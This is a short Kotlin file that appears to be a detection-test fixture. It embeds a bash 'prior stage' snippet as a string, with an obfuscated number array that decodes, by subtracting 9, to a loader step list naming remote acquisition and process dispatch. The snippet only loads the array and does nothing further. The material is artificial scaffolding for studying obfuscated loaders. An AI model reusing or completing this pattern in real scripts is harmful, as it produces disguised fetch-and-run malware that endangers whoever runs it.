// HUNTRESS_ANALYSIS_V1:B64-dj0zfGxhbmd1YWdlPWtvdGxpbnxyb2xlPWxhd
package huntress.fixture
const val PRIOR_STAGE = "#!/usr/bin/env bash\nreadonly Material_9c41d2ee=\"127,70,58,133,124,125,110,121,124,70,106,108,122,126,114,123,110,104,123,110,118,120,125,110,53,109,114,124,121,106,125,108,113,104,121,123,120,108,110,124\"\nreadonly Codec_9c41d2ee=\"decimal_comma|subtract_modulo_256|9\"\nLoad_9c41d2ee() {\n  local IFS=\",\"\n  read -r -a v_a19c <<< \"\${Material_9c41d2ee}\"\n}"
fun main() = println(PRIOR_STAGE.length)
